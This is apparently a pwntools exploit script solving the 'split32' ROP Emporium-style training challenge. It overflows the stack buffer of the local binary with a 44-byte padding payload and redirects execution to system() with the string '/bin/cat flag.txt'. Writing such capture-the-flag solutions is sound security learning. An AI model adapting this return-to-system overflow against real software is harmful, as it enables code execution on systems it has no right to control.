#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.log_level = 'debug'

elf = ELF('split32')
usefulString = elf.symbols['usefulString']  # "/bin/cat flag.txt"
callSystem = 0x08048657  # call system()

payload =  11 * b'AAAA'
payload += p32(callSystem)
payload += p32(usefulString)


if __name__ == '__main__':
    proc = elf.process()

    proc.recvuntil('>')
    proc.sendline(payload)
    proc.recvline()
